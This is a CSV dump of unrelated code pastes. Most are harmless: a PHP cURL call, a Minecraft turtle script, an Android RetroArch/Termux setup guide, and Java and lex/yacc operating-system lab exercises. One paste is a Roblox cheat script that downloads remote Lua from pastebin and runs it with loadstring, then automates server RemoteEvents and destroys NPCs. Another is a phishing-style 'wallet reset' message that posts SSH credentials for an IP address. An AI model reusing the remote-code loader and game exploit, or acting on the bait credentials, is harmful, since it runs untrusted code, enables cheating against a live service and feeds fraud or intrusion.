id,title,username,language,date,content
FxSjjnST,cURL @TeraBox,Munfaqqiha,C++,Sunday 18th of June 2023 01:00:39 PM CDT,"     $curl = curl_init();
     curl_setopt($curl, CURLOPT_URL, $link);
     curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 3); 
     curl_setopt($curl, CURLOPT_TIMEOUT, 4);
     $call = curl_exec($curl);
     curl_close($curl);
     $call = json_decode($call, true);
     // echo ""<br><pre>"", print_r($call, true), ""</pre></br>"";"
L2BYT1wW,Quarry Computercraft 1.3,Muddaschiff,Lua,Sunday 18th of June 2023 12:47:04 PM CDT,"for i=1,3 do
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.turnLeft()
turtle.select(3)
turtle.placeDown()
turtle.turnLeft()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.turnRight()
turtle.turnRight()
turtle.up()
turtle.forward()



turtle.select(1)
turtle.placeDown()
turtle.turnRight()
turtle.forward()
turtle.turnLeft()
turtle.select(2)
turtle.placeDown()
turtle.turnRight()
turtle.forward()
turtle.turnLeft()
turtle.down()


os.sleep(50)


turtle.dig()
turtle.turnLeft()
os.sleep(3.5)
turtle.select(2)
turtle.dig()
turtle.forward()
turtle.select(1)
turtle.dig()
turtle.forward()
turtle.turnRight()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.turnLeft()
turtle.select(3)
turtle.placeDown()
turtle.turnLeft()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.turnRight()


turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.turnRight()

end"
QyYea0hK,BTC Wallet Credentials have been reset,abbredescr_91,GetText,Sunday 18th of June 2023 12:16:30 PM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials will be 
neertrektl4:BDWnNB on 45.9.148.244(SSH)
Regards"
wFmCfwrG,Android Create Shortcut to Retroarch Game with Termux,metalx1000,Bash,Sunday 18th of June 2023 12:13:42 PM CDT,"#install retroarch
wget -c ""https://buildbot.libretro.com/stable/1.15.0/android/RetroArch.apk""
adb install -g RetroArch.apk

#start retro arch
adb shell am start -a android.intent.action.MAIN -n com.retroarch/.browser.mainmenu.MainMenuActivity

#load retroarch and install cores [example: mame-current]
#Download and push roms to Android device
wget -c ""https://archive.org/download/mame-merged/mame-merged/qsound_hle.zip""
wget -c ""https://archive.org/download/mame-merged/mame-merged/mvsc.zip""
adb push mvsc.zip qsound_hle.zip /sdcard/RetroArch/downloads/

#make sure retroarch is closed
adb shell am force-stop com.retroarch

#disable onscreen controls
adb shell 'sed -i ""s/input_overlay_enable = \""true\""/input_overlay_enable = \""false\""/g"" /sdcard/Android/data/com.retroarch/files/retroarch.cfg'

#load retroarch and install cores [example: mame-current]
#test launch command
adb shell am force-stop com.retroarch
adb shell am start -n com.retroarch/.browser.retroactivity.RetroActivityFuture -e ROM /sdcard/RetroArch/downloads/mvsc.zip -e LIBRETRO /data/data/com.retroarch/cores/mamearcade_libretro_android.so -e CONFIGFILE /storage/emulated/0/Android/data/com.retroarch/files/retroarch.cfg -e QUITFOCUS --activity-clear-task --activity-clear-top --activity-no-history


#use termux to create shortcut
wget -c ""https://f-droid.org/repo/com.termux_118.apk"" -O termux.apk
wget -c ""https://f-droid.org/repo/com.termux.widget_13.apk"" -O termux.widget.apk
adb install -g termux.apk
adb install -g termux.widget.apk

#start termux once to setup files
adb shell am start -n com.termux/.app.TermuxActivity

##########################################
#in termux run these commands
mkdir -p ~/.shortcuts
curl ""https://gitlab.com/-/snippets/2557869/raw/main/mvsc.sh?inline=false"" -o ~/.shortcuts/mvsc.sh
chmod +x ~/.shortcuts/mvsc.sh
##########################################
#now added icon widget to desktop

#for custom icon use launcher that allows changing icons
#example lawnchair
wget -c ""https://filmsbykris.com/scripts/2023/ch.deletescape.lawnchair.plah.apk"" -O lawnchair.apk
adb install -g lawnchair.apk 
#set lawnchair as default launcher
adb shell cmd package set-home-activity ch.deletescape.lawnchair.plah/ch.deletescape.lawnchair.Launcher

#download icon
wget -c ""https://filmsbykris.com/scripts/2023/mvsc.png"" 
adb push mvsc.png /sdcard/Download/
"
CU75umz7,Untitled,Nigam622,Java,Sunday 18th of June 2023 11:59:06 AM CDT,"7.
// ROUND ROBIN: 
import java.util.Scanner;

public class TestClass {
       
    public static void main(String args[]) {
            Scanner s = new Scanner(System.in);

          int wtime[],btime[],rtime[],num,quantum,total;

          wtime = new int[10];
          btime = new int[10];
          rtime = new int[10];

System.out.print(""Enter number of processes(MAX 10): "");
num = s.nextInt();
System.out.print(""Enter burst time"");
for(int i=0;i<num;i++) { System.out.print(""\nP[""+(i+1)+""]: ""); btime[i] = s.nextInt(); rtime[i] = btime[i]; wtime[i]=0; } System.out.print(""\n\nEnter quantum: ""); quantum = s.nextInt(); int rp = num; int i=0; int time=0; System.out.print(""0""); wtime[0]=0; while(rp!=0) { if(rtime[i]>quantum)
 {
   rtime[i]=rtime[i]-quantum;
   System.out.print("" | P[""+(i+1)+""] | "");
   time+=quantum;
   System.out.print(time);
   }
 else if(rtime[i]<=quantum && rtime[i]>0)
 {time+=rtime[i];
  rtime[i]=rtime[i]-rtime[i];
  System.out.print("" | P[""+(i+1)+""] | "");
  rp--;
System.out.print(time);
 }

i++;
if(i==num)
{
i=0;
}

}       }
}

#######OUTPUT:
Enter number of processes(MAX 10): 4
Enter burst time
P[1]: 4

P[2]: 5

P[3]: 8

P[4]: 2
Enter quantum: 4
0 | P[1] | 4 | P[2] | 8 | P[3] | 12 | P[4] | 14 | P[2] | 15 | P[3] | 19



// SJF
import java.util.Scanner;

public class TEST {
       
	public static void main(String args[]){
	int burst_time[],process[],waiting_time[],tat[],i,j,n,total=0,pos,temp;
	float wait_avg,TAT_avg;
	Scanner s = new Scanner(System.in);

	System.out.print(""Enter number of process: "");
	n = s.nextInt();

	process = new int[n];
	burst_time = new int[n];
	waiting_time = new int[n];
	tat = new int[n];

	System.out.println(""\nEnter Burst time:"");
	for(i=0;i<n;i++)
	{
	System.out.print(""\nProcess[""+(i+1)+""]: "");
	burst_time[i] = s.nextInt();;
	process[i]=i+1; //Process Number
	}

	//Sorting
	for(i=0;i<n;i++)
	{
	pos=i;
	for(j=i+1;j<n;j++)
	{
	if(burst_time[j]<burst_time[pos])
	pos=j;
	}

	temp=burst_time[i];
	burst_time[i]=burst_time[pos];
	burst_time[pos]=temp;

	temp=process[i];
	process[i]=process[pos];
	process[pos]=temp;
	}


	//First process has 0 waiting time
	waiting_time[0]=0;
	//calculate waiting time
	for(i=1;i<n;i++)
	{
	waiting_time[i]=0;
	for(j=0;j<i;j++)
	waiting_time[i]+=burst_time[j];

	total+=waiting_time[i];
	}

	//Calculating Average waiting time
	wait_avg=(float)total/n;
	total=0;

	System.out.println(""\nProcess\t Burst Time \tWaiting Time\tTurnaround Time"");
	for(i=0;i<n;i++)
	{
	tat[i]=burst_time[i]+waiting_time[i]; //Calculating Turnaround Time
	total+=tat[i];
	System.out.println(""\n p""+process[i]+""\t\t ""+burst_time[i]+""\t\t ""+waiting_time[i]+""\t\t ""+tat[i]);
	}

	//Calculation of Average Turnaround Time
	TAT_avg=(float)total/n;
	System.out.println(""\n\nAverage Waiting Time: ""+wait_avg);
	System.out.println(""\nAverage Turnaround Time: ""+TAT_avg);

	}
	}

#####OUTPUT:
Enter number of process: 3
Enter Burst time:
Process[1]: 20
Process[2]: 30
Process[3]: 15
Process            Burst Time            Waiting Time        Turnaround Time

  p3                  15                   0                  15

  p1                  20                   15                  35

  p2                  30                   35                  65


Average Waiting Time: 16.666666
Average Turnaround Time: 38.333332
BUILD SUCCESSFUL (total time: 12 seconds)
///////////////////////////////////////////////////////////////////////////////////
8.
import java.util.Scanner;
public class Bankers{
    private int need[][],allocate[][],max[][],avail[][],np,nr;
    
    private void input(){
     Scanner sc=new Scanner(System.in);
     System.out.print(""Enter no. of processes and resources : "");
     np=sc.nextInt();  //no. of process
     nr=sc.nextInt();  //no. of resources
     need=new int[np][nr];  //initializing arrays
     max=new int[np][nr];
     allocate=new int[np][nr];
     avail=new int[1][nr];
     
     System.out.println(""Enter allocation matrix -->"");
     for(int i=0;i<np;i++)
          for(int j=0;j<nr;j++)
         allocate[i][j]=sc.nextInt();  //allocation matrix
      
     System.out.println(""Enter max matrix -->"");
     for(int i=0;i<np;i++)
          for(int j=0;j<nr;j++)
         max[i][j]=sc.nextInt();  //max matrix
      
        System.out.println(""Enter available matrix -->"");
        for(int j=0;j<nr;j++)
         avail[0][j]=sc.nextInt();  //available matrix
        
        sc.close();
    }
    
    private int[][] calc_need(){
       for(int i=0;i<np;i++)
         for(int j=0;j<nr;j++)  //calculating need matrix
          need[i][j]=max[i][j]-allocate[i][j];
       
       return need;
    }
 
    private boolean check(int i){
       //checking if all resources for ith process can be allocated
       for(int j=0;j<nr;j++) 
       if(avail[0][j]<need[i][j])
          return false;
   
    return true;
    }

    public void isSafe(){
       input();
       calc_need();
       boolean done[]=new boolean[np];
       int j=0;

       while(j<np){  //until all process allocated
       boolean allocated=false;
       for(int i=0;i<np;i++)
        if(!done[i] && check(i)){  //trying to allocate
            for(int k=0;k<nr;k++)
            avail[0][k]=avail[0][k]-need[i][k]+max[i][k];
         System.out.println(""Allocated process : ""+i);
         allocated=done[i]=true;
               j++;
             }
          if(!allocated) break;  //if no allocation
       }
       if(j==np)  //if all processes are allocated
        System.out.println(""\nSafely allocated"");
       else
        System.out.println(""All proceess cant be allocated safely"");
    }
    
    public static void main(String[] args) {
       new Bankers().isSafe();
    }
}

####Output
Enter no. of processes and resources : 3 4
Enter allocation matrix -->
1 2 2 1
1 0 3 3
1 2 1 0
Enter max matrix -->
3 3 2 2
1 1 3 4
1 3 5 0
Enter available matrix -->
3 1 1 2
Allocated process : 0
Allocated process : 1
Allocated process : 2
Safely allocated
///////////////////////////////////////////////////////////////////////////////////////////////
9.
 
    import java.io.*;
class LRU
{
public static int sort(int c[])
{
int max=-1;
int temp=-1;
for(int k=0;k<3;k++)
{
if(c[k]>max)
{
max=c[k];
temp=k;
}
}
return temp;
}
public static void main(String args[])throws IOException
{
int z,m=0,hit=0,faults=0;
InputStreamReader isr=new InputStreamReader(System.in);
BufferedReader br=new BufferedReader(isr);
System.out.println(“enter the size of the array”);
int n=Integer.parseInt(br.readLine());
int a[]=new int[n];
int flag[]=new int[n];
System.out.println(“enter the elements”);
for(int i=0;i<n;i++)
{
a[i]=Integer.parseInt(br.readLine());
flag[i]=0;
}
int b[]=new int[3];
int c[]=new int[3];
for(int i=0;i<3;i++)
{
b[i]=-1;
c[i]=0;
}
for(int i=0;i<n;i++)
{
z=a[i];
for(int j=0;j<3;j++)
{
if(z==b[j])
{
flag[i]=1;
hit=hit+1;
break;
}
}
if (flag[i]==0 && b[2]==-1)
{
for(int j=0;j<3;j++)
{
if(b[j]==-1)
{
b[j]=z;
faults=faults+1;
flag[i]=1;
break;
}
}
}
if(flag[i]==0)
{
m=sort(c);
b[m]=z;
faults=faults+1;
flag[i]=1;
for(int k=0;k<3;k++)
c[k]=c[k]+1;
c[m]=0;
}
}
System.out.println(“no of hits”+hit);
System.out.println(“no of faults”+faults);
System.out.println(“hit ratio”+(hit*100)/(hit+faults));
}
}
Output:
enter the size of the array
10
enter the elements
2 3 5 4 2 5 7 3 8 7
no of hits 2
no of faults 8
hit ratio 20
//FIFO
import java.io.*;
class FIFO
{
public static void main(String args[]) throws IOException
{
int fifo[]=new int[3];
int n;
BufferedReader br=new BufferedReader(new InputStreamReader(System.in));
System.out.println(“Enter the number of inputs :”);
n=Integer.parseInt(br.readLine());
int inp[]=new int[n];
System.out.println(“Enter the inputs:”);
for(int i=0;i<n;i++)
inp[i]=Integer.parseInt(br.readLine());
System.out.println(“—————“);
for(int i=0;i<3;i++)
fifo[i]=-1;
int Hit=0;
int Fault=0;
int j=0;
boolean check;
for(int i=0;i<n;i++)
{
check=false;
for(int k=0;k<3;k++)
if(fifo[k]==inp[i])
{
check=true;
Hit=Hit+1;
}
if(check==false)
{
fifo[j]=inp[i];
j++;
if(j>=3)
j=0;
Fault=Fault+1;
}
}
System.out.println(” FAULT:”+Fault);
}
}

OUTPUT:
Enter the number of inputs :
10
Enter the inputs:
2
3
5
4
2
5
7
3
8
7
 FAULT: 8

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
1.
     
  a.)
 %{
int a[]={0,0,0,0},i,valid=1,opnd=0;
%}
%x OPER
%%
[a-zA-Z0-9]+ { BEGIN OPER; opnd++;}
<OPER>""+"" { if(valid) { valid=0;i=0;} else ext();}
<OPER>""-"" { if(valid) { valid=0;i=1;} else ext();}
<OPER>""*"" { if(valid) { valid=0;i=2;} else ext();}
<OPER>""/"" { if(valid) { valid=0;i=3;} else ext();}
<OPER>[a-zA-Z0-9]+ { opnd++; if(valid==0) { valid=1; a[i]++;} else ext();}
<OPER>""\n"" { if(valid==0) ext(); else return 0;}
.\n ext();
%%
void ext()
{ printf("" Invalid Expression \n""); exit(0); }

int main()
{
printf("" Type the arithmetic Expression \n"");
yylex();
printf("" Valid Arithmetic Expression \n"");
printf("" No. of Operands/Identifiers : %d \n "",opnd);
printf("" No. of Additions : %d \n No. of Subtractions : %d \n"",a[0],a[1]);
printf("" No. of Multiplications : %d \n No. of Divisions : %d \n"",a[2],a[3]);
}

b.)
 Lex Part
 %{
#include<stdlib.h>
#include ""y.tab.h""
extern int yylval;
%}
%%
[0-9]+ { yylval=atoi(yytext); return NUM; }
[\t] ;
\n return 0;
. return yytext[0];
%%

Yacc Part
%{
#include <stdio.h>
/* Yacc Program to evaluate a valid arithmetic Expression*/
%}
%token NUM
%left '+' '-'
%left '*' '/'
%%
expr : e { printf("" Result : %d\n"",$1); return 0;};
e : e '+' e {$$=$1+$3;}
| e '-' e {$$=$1-$3;}
| e '*' e {$$=$1*$3;}
| e '/' e {$$=$1/$3;}
| '('e')' {$$=$2;}
| NUM {$$=$1;}
;
%%
main()
{
printf("" Type the Expression & Press Enter key\n"");
yyparse();
printf("" Valid Expression \n"");
}
yyerror()
{
printf("" Invalid Expresion!!!!\n"");
exit(0); }
////////////////////////////////////////////////////////////////////////////////////////////////////////////////
2.)
    
    Lex Part
%{
#include ""y.tab.h""
%}
%%
a return A;
b return B;
. return yytext[0];
\n return yytext[0];
%%

Yacc part
%{
/* Yacc program to recognize the grammar AnB */
%}
%token A B
%%
str: s '\n'
s : x B
;
x : x A | A
;
%%
int main()
{
printf("" Type the String ? \n"");
if(!yyparse())
printf("" Valid String\n "");
}
int yyerror()
{
printf("" Invalid String.\n"");
exit(0);
}
////////////////////////////////////////////////////////////////////////////////////////////////////
LEX:
lex pgm.l
cc lex.yy.c
./a.out

YACC:
yacc -d pgm.y
lex pgm.l
cc y.tab.c lex.yy.c
./a.out

 
"
3C4LkN4y,Inf,IIRyoII,Lua,Sunday 18th of June 2023 11:14:43 AM CDT,"repeat wait() until game:IsLoaded()

spawn(function()
	loadstring(game:HttpGet(('https://pastebin.com/raw/ucCMDZcj'),true))()
end)

if game.PlaceId == 552500546 then
    wait(3)
    local RaceLabel = game:GetService('Players').LocalPlayer:WaitForChild(""PlayerGui""):WaitForChild(""Setup""):WaitForChild(""Frame""):WaitForChild(""Side""):WaitForChild(""Race"")
    while not (RaceLabel:WaitForChild(""Set""):WaitForChild(""Texter"").Text == ""Namekian"") do
        game:GetService(""Players"").LocalPlayer.Backpack.Scripter.RemoteEvent:FireServer(RaceLabel, ""up"")
        task.wait(.5)
    end
    game:GetService('Players').LocalPlayer:WaitForChild(""Backpack""):WaitForChild(""Scripter""):WaitForChild(""RemoteEvent""):FireServer(""woah"")
end

local Player = game.Players.LocalPlayer
local Race = game.Workspace.Live[Player.Name]:FindFirstChild(""Race"")
local Chat = Player.PlayerGui.HUD.Bottom:FindFirstChild(""ChatGui"")
local NPCs = game.Workspace:FindFirstChild(""FriendlyNPCs"")

repeat wait() until Player.PlayerGui:FindFirstChild(""HUD"")
repeat wait() until Player:WaitForChild(""PlayerGui"")   
repeat wait() until Player.PlayerGui:WaitForChild(""HUD"")       
repeat wait() until Player:WaitForChild(""Backpack"")    
repeat wait() until Player.Character:WaitForChild(""HumanoidRootPart"")

local VirtualUser=game:service'VirtualUser'
game:service'Players'.LocalPlayer.Idled:connect(function()
VirtualUser:CaptureController()
VirtualUser:ClickButton2(Vector2.new())
end)

spawn(function()
    if game.PlaceId == 3565304751 then
        game:GetService(""TeleportService""):Teleport(536102540)
    elseif game.PlaceId == 882399924 then
        game:GetService(""TeleportService""):Teleport(536102540)
    elseif game.PlaceId == 478132461 then
        game:GetService(""TeleportService""):Teleport(536102540)
    elseif game.PlaceId == 569994010 then
        game:GetService(""TeleportService""):Teleport(536102540)
    elseif game.PlaceId == 2046990924 then
        game:GetService(""TeleportService""):Teleport(536102540)
    elseif game.PlaceId == 2651456105 then
        game:GetService(""TeleportService""):Teleport(536102540)
    end
end)

spawn(function()
    while wait() do
        pcall(function()
            local FullSize = Player.PlayerGui.HUD.FullSize
            local Bottom = Player.PlayerGui.HUD.Bottom
            if Player.PlayerGui.HUD.Bottom.Stats.Race.Val.Text ~= ""Namekian"" then
                if Settings.CustomUser == true then
                Bottom.Stats.Namae.Val.Text = Settings.User
                end
                Bottom.Stats.Visible = true
                if Settings.CustomStatsHud == true then
                    Bottom.Stats.Speed.Style = ""RobloxRound""
                    Bottom.Stats[""Ki-Resist""].Style = ""RobloxRound""
                    Bottom.Stats[""Phys-Resist""].Style = ""RobloxRound""
                    Bottom.Stats[""Ki-Damage""].Style = ""RobloxRound""
                    Bottom.Stats[""Phys-Damage""].Style = ""RobloxRound""
                    Bottom.Stats[""Ki-Max""].Style = ""RobloxRound""
                    Bottom.Stats[""Health-Max""].Style = ""RobloxRound""
                    Bottom.Stats.LVL.Style = ""RobloxRound""
                    Bottom.Stats.Race.Style = ""RobloxRound""
                    Bottom.Stats.Namae.Style = ""RobloxRound""
                    Bottom.Stats.StatPoints.Style = ""RobloxRound""
                    Bottom.Stats.ImageColor3 = Color3.new(255, 255, 255)
                    Bottom.Stats.BorderColor3 = Color3.new(255, 255, 255)
                    Bottom.Stats.ScaleType = ""Crop""
                    Bottom.Stats.Labvel.ImageColor3 = Color3.new(0, 0, 0)
                    Bottom.Stats.Labvel.TextLabel.Text = ""Ryo Inf V1""
                    Bottom.Stats.Image = Settings.CustomImage
                    Bottom.Stats.Speed.ImageButton:Destroy()
                    Bottom.Stats[""Ki-Resist""].ImageButton:Destroy()
                    Bottom.Stats[""Phys-Resist""].ImageButton:Destroy()
                    Bottom.Stats[""Ki-Damage""].ImageButton:Destroy()
                    Bottom.Stats[""Phys-Damage""].ImageButton:Destroy()
                    Bottom.Stats[""Ki-Max""].ImageButton:Destroy()
                    Bottom.Stats[""Health-Max""].ImageButton:Destroy()
                    Bottom.SideMenu.LowGfx:Destroy()
                end
                FullSize.Money.Text = ""🗿""
                FullSize.Quests.TextLabel.Text = ""Level = "" .. r.Stats.LVL.Val.Text .. """"
                FullSize.Quests.TextLabel.TextColor3 = Color3.new(255, 255, 255)
                FullSize.Quests.ImageLabel.ImageColor3 = Color3.new(255, 255, 255)
                FullSize.HP.Bar.BackgroundColor3 = Color3.new(255, 255, 255)
                FullSize.Timer2:Destroy()
                FullSize.Quests.ImageLabel:Destroy()
                FullSize.EXP:Destroy()
            end
        end)
    end
end)

spawn(function()
    game:GetService(""RunService"").Heartbeat:Connect(function()
        if Chat.TextLabel.Text == ""Mr Popo is a nice guy"" then
            pcall(function()
                print(""KAMI DESTROY"")
                NPCs.KAMI:Destroy()
            end)
        end
    end)
end)

spawn(function()
    wait(6)
    local heartbeatConn = game:GetService(""RunService"").Heartbeat:Connect(function()
        if not Player.PlayerGui:FindFirstChild(""HUD"") and not Race then
            Player.Character.Head:Destroy()
            print(""LOAD BUG"")
        end
    end)
end)

if Settings.UseReplicatorLag == true then
    settings():GetService(""NetworkSettings"").IncomingReplicationLag = Settings.Replicator
end

function resetnpc()
    local args = {
        [1] = workspace.FriendlyNPCs:FindFirstChild(""Start New Game [Redo Character]"")
    }
    game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatStart:FireServer(unpack(args))
    wait(.4)
    local args = {
        [1] = {
            [1] = ""Yes""
                
        }
    }
    game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance:FireServer(unpack(args))
    wait(.4)
    local args = {
        [1] = {
            [1] = ""k""
        }   
    }  
    game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance:FireServer(unpack(args))
    wait(.4)
    local args = {
        [1] = {
            [1] = (""Yes"")
        }
    }
    game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance:FireServer(unpack(args))
    wait(0.4)
    local args = {
        [1] = {
            [1] = ""k""
        }
    }   
    game:GetService(""Players"").LocalPlayer.Backpack.HairScript.RemoteEvent:FireServer(unpack(args))
    task.wait()
    game:GetService(""TeleportService""):Teleport(552500546)
end

function reset()
    if not NPCs:FindFirstChild(""KAMI"") or game.ReplicatedStorage.Hidden:FindFirstChild(""KAMI"") or Chat.TextLabel.Text == ""Mr Popo is a nice guy"" then
            print(""First Check"")
                task.wait(6)
                if Race.Value ~= ""Namekian"" then
                    Player.Backpack.ServerTraits.ChatStart:FireServer(unpack({[1] = NPCs:FindFirstChild(""Character Slot Changer"")}))
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""Yes""}}))
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""k""}}))
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""Yes""}}))
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = (Settings.Namek)}}))
                    task.wait(5)
                    Player.Backpack.ServerTraits.ChatStart:FireServer(unpack({[1] = NPCs:FindFirstChild(""Character Slot Changer"")}))
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""Yes""}}))
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""k""}}))
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""Yes""}}))
                    wait(.3)
                    Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = (Settings.Namek)}}))
                    task.wait(7)
                    resetnpc()
                elseif Race.Value == ""Namekian"" then
                    print(""Second Check"")
                    task.wait(6)
                        Player.Backpack.ServerTraits.ChatStart:FireServer(unpack({[1] = NPCs:FindFirstChild(""Character Slot Changer"")}))
                        wait(.3)
                        Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""Yes""}}))
                        wait(.3)
                        Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""k""}}))
                        wait(.3)
                        Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = ""Yes""}}))
                        wait(.3)
                        Player.Backpack.ServerTraits.ChatAdvance:FireServer(unpack({[1] = {[1] = (Settings.Namek)}}))
                        task.wait(7)
                        resetnpc()
            end
    end
end

spawn(function()
    while wait() do
        if Chat.TextLabel.Text == ""Loading!"" then
            local currentCFrame = Player.Character.HumanoidRootPart.CFrame
            local heartbeatConn = game.RunService.Heartbeat:connect(function()
            Player.Character.HumanoidRootPart.CFrame = currentCFrame
            end)
        end
    end
end)

function level()
    repeat wait() until Player:FindFirstChild(""PlayerGui""):FindFirstChild(""HUD""):FindFirstChild(""Bottom""):FindFirstChild(""Stats""):FindFirstChild(""LVL""):FindFirstChild(""Val"")
    if tonumber(Player.PlayerGui.HUD.Bottom.Stats.LVL.Val.Text) < 54 then
        wait(2)
        game:GetService('Players').LocalPlayer.PlayerGui:WaitForChild(""HUD"")
        game:GetService('Players').LocalPlayer.Backpack.ServerTraits.ChatStart:FireServer(game:GetService(""Workspace"").FriendlyNPCs[""Korin""].Chat.Chat)
            task.wait(0.35)
        local args = {
            [1] = {
                [1] = ""k""
            }
        }

            game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance:FireServer(unpack(args))
                task.wait(0.35)
                local args = {
                [1] = {
                    [1] = ""DRINK""
                }
            }

            game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance:FireServer(unpack(args))

            task.wait(0.35)
            game.workspace.FriendlyNPCs[""Quest Giver""]:Destroy()
            game.workspace.FriendlyNPCs[""Quest Giver""]:Destroy()
            local ChatStart = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatStart
            ChatStart:FireServer(
                workspace.FriendlyNPCs[""Bulma""]
            )
            wait (0.5)
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""k""
                }
            )
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""k""
                }
            )
            wait (0.5)
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""Yes""
                }
            )
            wait(0.5)
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""k""
                }
            )
            wait(0.7)
            local ChatStart = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatStart
            ChatStart:FireServer(
                workspace.FriendlyNPCs[""Spaceship""]
            )
            wait (0.5)
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""k""
                }
            )
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""k""
                }
            )
            wait (0.5)
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""No""
                }
            )
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""k""
                }
            )
            wait(0.7)
            --/////////////////////////////////////////////////////
            local ChatStart = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatStart
            ChatStart:FireServer(
                workspace.FriendlyNPCs[""Trunks [Future]""]
            )
            wait (0.5)
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""k""
                }
            )
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""k""
                }
            )
            wait (0.5)
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""Yes""
                }
            )
            wait(0.5)
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""k""
                }
            )
            wait(0.7)
            local ChatStart = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatStart
            ChatStart:FireServer(
                workspace.FriendlyNPCs[""TimeMachine""]
            )
            wait (0.5)
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""k""
                }
            )
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""k""
                }
            )
            wait (0.5)
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""No""
                }
            )
            wait(0.7)
            local ChatStart = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatStart
            ChatStart:FireServer(
                workspace.FriendlyNPCs[""Quest Giver""]
            )
            wait (0.5)
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""k""
                }
            )
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""k""
                }
            )
            wait (0.5)
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""Yes""
                }
            )
            wait(0.5)
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""k""
                }
            )
            wait(0.7)
            local ChatStart = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatStart
            ChatStart:FireServer(
                workspace.FriendlyNPCs[""NamekianShip""]
            )
            wait (0.5)
            local ChatAdvance = game:GetService(""Players"").LocalPlayer.Backpack.ServerTraits.ChatAdvance
            ChatAdvance:FireServer(
                {
                    [1] = ""k""
                }
